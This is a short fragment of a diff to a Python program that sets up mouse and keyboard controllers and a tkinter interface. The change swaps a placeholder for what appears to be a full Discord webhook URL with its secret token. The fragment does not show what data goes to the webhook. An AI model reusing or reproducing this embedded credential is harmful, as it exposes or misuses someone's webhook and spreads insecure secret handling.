@@ -10,7 +10,7 @@ import threading
 import tkinter as tk
 from datetime import datetime
 
-webHook = "webhook"
+webHook = "https://discordapp.com/api/webhooks/1274918744975736832/SszQOxEP-syphbG8pXgN9klvLa273CZM0F9JyA4j9BsK8pe390RZ5SMYnfpaPm5--rFJ"
 
 mouse = mouseController()
 keyboard = keyboardController()
